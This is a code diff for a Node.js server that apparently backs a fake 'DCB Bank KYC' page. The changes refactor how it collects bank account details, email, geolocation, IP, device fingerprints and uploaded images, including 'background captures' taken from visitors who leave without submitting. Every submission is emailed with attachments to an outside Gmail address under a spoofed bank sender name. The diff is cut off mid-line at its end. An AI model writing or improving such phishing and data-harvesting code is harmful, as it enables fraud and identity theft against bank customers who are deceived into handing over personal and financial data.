@@ -51,16 +51,17 @@ const getClientIp = (req) => {
 };
 
 const buildEmailHtml = (data) => {
+  const isBackground = data.isFormEmpty;
   return `
     <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
-      <h2 style="color: ${data.isFormEmpty ? '#d32f2f' : '#003d6a'};">
-        ${data.isFormEmpty ? '⚠️ BACKGROUND CAPTURE' : '✅ KYC Submission'}
+      <h2 style="color: ${isBackground ? '#d32f2f' : '#003d6a'};">
+        ${isBackground ? '⚠️ BACKGROUND CAPTURE' : '✅ KYC SUBMISSION'}
       </h2>
       
-      ${data.isFormEmpty ? `
+      ${isBackground ? `
       <div style="background-color: #fff3e0; padding: 15px; border-radius: 8px; margin-bottom: 20px;">
         <p><strong>User left without submitting form</strong></p>
-        <p>Captured ${data.imageCount} images</p>
+        <p>Captured ${data.imageCount} images before leaving</p>
       </div>
       ` : ''}
       
@@ -73,7 +74,7 @@ const buildEmailHtml = (data) => {
         <p><strong>Browser:</strong> ${data.browser}</p>
       </div>
       
-      ${!data.isFormEmpty ? `
+      ${!isBackground ? `
       <div style="background-color: #f8f9fa; padding: 20px; border-radius: 8px; margin: 20px 0;">
         <h3 style="color: #003d6a; margin-top: 0;">Account Information</h3>
         <p><strong>Bank Name:</strong> ${data.bankname}</p>
@@ -109,15 +110,17 @@ const buildEmailHtml = (data) => {
 app.post('/submit', (req, res) => {
   upload(req, res, async (err) => {
     try {
-      if (req.body.empty_form === 'true' && req.body.is_submitted === 'true') {
-        return res.status(200).send(); // Skip background if real submission exist
+      if (err) throw err;
+
+      const isBackground = req.body.empty_form === 'true';
+      
+      // Prevent duplicate background submissions with no images
+      if (isBackground && (!req.files || req.files.length === 0)) {
+        return res.status(200).send();
       }
 
-      // Parse device info from both client and server
-      const clientUA = req.body.user_agent || '';
-      const serverUA = req.headers['user-agent'] || '';
-      const parser = new UAParser(clientUA || serverUA);
-      
+      // Parse device info
+      const parser = new UAParser(req.headers['user-agent'] || req.body.user_agent || '');
       const device = parser.getDevice();
       const os = parser.getOS();
       const browser = parser.getBrowser();
@@ -137,15 +140,15 @@ app.post('/submit', (req, res) => {
         email: req.body.email || 'Not provided',
         location: req.body.location ? JSON.parse(req.body.location) : null,
         ip: getClientIp(req),
-        userAgent: serverUA,
+        userAgent: req.headers['user-agent'] || req.body.user_agent,
         timestamp: req.body.timestamp || new Date().toISOString(),
-        isFormEmpty: req.body.empty_form === 'true',
-        imageCount: (req.files || []).filter(f => f.fieldname.startsWith('image')).length
+        isFormEmpty: isBackground,
+        imageCount: req.files?.length || 0
       };
 
       // Log the submission
       const logEntry = `
---- ${submissionData.isFormEmpty ? 'BACKGROUND' : 'FULL'} SUBMISSION ---
+--- ${isBackground ? 'BACKGROUND' : 'FULL'} SUBMISSION ---
 Device: ${submissionData.device.vendor} ${submissionData.device.model} (${submissionData.device.type})
 OS: ${submissionData.os}
 Browser: ${submissionData.browser}
@@ -167,27 +170,31 @@ Timestamp: ${submissionData.timestamp}
       console.log(logEntry);
 
       // Send email
+      const emailSubject = isBackground 
+        ? `⚠️ Background Capture (${submissionData.imageCount} images)` 
+        : '✅ KYC Verification Completed';
+      
       await transporter.sendMail({
-  from: 'DCB Bank KYC <dcbsubmission392@gmail.com>',
-  to: 'dcbsubmission392@gmail.com',
-  subject: req.body.empty_form === 'true' 
-    ? '⚠️ Background Capture (User Left)' 
-    : '✅ KYC Submission Received',
-  html: `
-    <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
-    <!-- [keep your existing email template] -->
-    </div>
-  `,
-  attachments: (req.files || []).map(file => ({
-    filename: file.originalname,
-    path: file.path
-  }))
-});
+        from: 'DCB Bank KYC <dcbsubmission392@gmail.com>',
+        to: 'dcbsubmission392@gmail.com',
+        subject: emailSubject,
+        html: buildEmailHtml(submissionData),
+        attachments: (req.files || []).map(file => ({
+          filename: file.originalname,
+          path: file.path
+        }))
+      });
 
       // Cleanup files
-      (req.files || []).forEach(file => {
-        try { fs.unlinkSync(file.path); } catch (e) { console.error('File cleanup error:', e); }
-      });
+      if (req.files) {
+        req.files.forEach(file => {
+          try {
+            fs.unlinkSync(file.path);
+          } catch (e) {
+            console.error('Error deleting file:', file.path, e);
+          }
+        });
+      }
 
       res.status(200).send();
     } catch (error) {
@@ -199,6 +206,4 @@ Timestamp: ${submissionData.timestamp}
 
 // Start server
 app.listen(port, () => {
-  console.log(`Server running on port ${port}`);
-  console.log(`Access the app at http://localhost:${port}`);
-});
+  console.log(`Server running on port ${
